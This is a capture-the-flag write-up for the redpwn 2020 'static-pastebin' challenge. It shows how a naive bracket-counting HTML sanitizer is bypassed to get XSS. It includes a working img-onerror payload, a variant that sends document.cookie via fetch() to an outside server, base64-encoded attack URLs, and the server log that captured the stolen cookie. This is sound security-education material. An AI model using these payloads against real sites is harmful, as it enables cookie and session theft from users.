# static-pastebin

The `/paste` route takes a base64 hash value, runs it through a `clean` function and then uses `element.innerHTML=...` to set it.  It looks like we should be able to
get XSS if we can bypass the `clean` function.  Lets take a look at it

```javascript
function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

So it looks like this is defeatable if we add in a `>` character prior to the opening of a tag, and then a second `<` after the close of the tag.  Only problem with
script tags, is I don't think there's a valid javascript command that starts with a `<` and I'm not sure we can comment it out.  So lets just keep the javascript
inside the single tag itself with

```
><img src=x onerror=alert(1)><
```

When we base64 encode this and navigate to `https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxKT48` we get the alert, success!  The
second part of the challenge is that we can report a URL to the admin.  Lets modify our payload and see if the admin has access to any interesting cookie values:

```
><img src=x onerror="fetch('https://www.zoeyinthe.cloud/'+btoa(document.cookie));"><
```

Then after base64 encoding the URL we end up with is `https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPXggb25lcnJvcj0iZmV0Y2goJ2h0dHBzOi8vd3d3LnpvZXlpbnRoZS5jbG91ZC8nK2J0b2EoZG9jdW1lbnQuY29va2llKSk7Ij48`.
Lets send this to the admin.  We'll need to do this manually in the browser given the recaptcha challenge.  We drop the URL into the form, and then go to check
the logs on our server:

```
107.178.229.236 - - [22/Jun/2020:02:59:57 +0000] "GET /ZmxhZz1mbGFnezU0bjF0MXo0dDEwbl9rMW5kNF9oNHJkfQ== HTTP/1.1" 404 199 "https://static-pastebin.2020.redpwnc.tf/paste/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.0 Safari/537.36"
```